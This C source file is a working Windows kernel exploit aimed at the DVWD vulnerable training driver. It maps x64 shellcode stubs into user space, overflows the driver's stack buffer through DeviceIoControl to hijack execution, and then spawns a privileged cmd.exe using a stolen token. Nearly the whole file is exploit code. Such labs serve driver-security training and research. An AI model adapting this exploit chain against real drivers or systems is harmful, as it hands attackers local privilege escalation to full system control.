#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <tchar.h>
#include <Sddl.h>
#include "KernelArch.h"
#include "KernelExploit.h"


#define SHELLCODE_OFF 2
#define JUMPBACK_OFF 14
char stubCode[] =
"\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41"   // mov    $0x4141414141414141,%rax
"\xff\xd0"                                   // callq  *%rax
"\x48\xb8\x42\x42\x42\x42\x42\x42\x42\x42"   // mov    $0x4242424242424242,%rax
"\xff\xe0";                                  // jmpq   *%rax


BOOL GetSystemToken()
{
  HANDLE hToken;
  BOOL retVal;
  retVal = CreateTokenFromCaller(&hToken);
  if(retVal == FALSE)
  {
	  wprintf(L"Error: Unable to create a Token\n");
    return FALSE;
  }
  else 
  {
	  retVal = SpawnChildWithToken(hToken, L"c:\\Windows\\system32\\cmd.exe");
	  if(retVal == FALSE)
	  {
		  wprintf(L"Error: Unable to create privileged cmd.exe process\n");
      return FALSE;
	  }
  }
  return TRUE;
}


#define BUFF_SIZE  0x78
#define GAP_TO_RET 0x18
BOOL TriggerOverflow64(VOID)
{
  HANDLE hFile;
  DWORD dwReturn;
  BOOL ret;
  PUCHAR stubMap,map,uBuff=NULL;
  ULONG_PTR pShellcode;

  *((PULONG64)(stubCode + SHELLCODE_OFF)) = (ULONG_PTR)ShellcodePrivilegesAdd;
  *((PULONG64)(stubCode + JUMPBACK_OFF )) = (ULONG_PTR)hardcodedReturn;
  
  stubMap = CreateUspaceExecMapping(1);
  map = CreateUspaceMappingWithAddr(1, (PVOID)0x00000000FF000000L);  // make sure it is between guard pages

  if(!map || !stubMap)
  {
    wprintf(L"[!] Anonymous Map Failed!\n");
    return FALSE;
  }

  memcpy(stubMap, stubCode, sizeof(stubCode)-1);

  pShellcode = (ULONG_PTR)stubMap;
  FillMap(map, pShellcode, GlobalInfo.dwAllocationGranularity);
  uBuff = map - (BUFF_SIZE - GAP_TO_RET);

  hFile = CreateFile(L"\\\\.\\DVWD", 
					 GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, 
					 NULL, 
					 OPEN_EXISTING, 
					 0, 
					 NULL);

  if(hFile != INVALID_HANDLE_VALUE)
	  ret = DeviceIoControl(hFile, DEVICEIO_DVWD_STACKOVERFLOW, uBuff, BUFF_SIZE, NULL, 0, &dwReturn, NULL);
  
  CloseHandle(hFile); 

  if(ret != 0)
  {
    if(GetSystemToken() == FALSE)
      return FALSE;
  }
  else
    return FALSE;


  return TRUE;
}



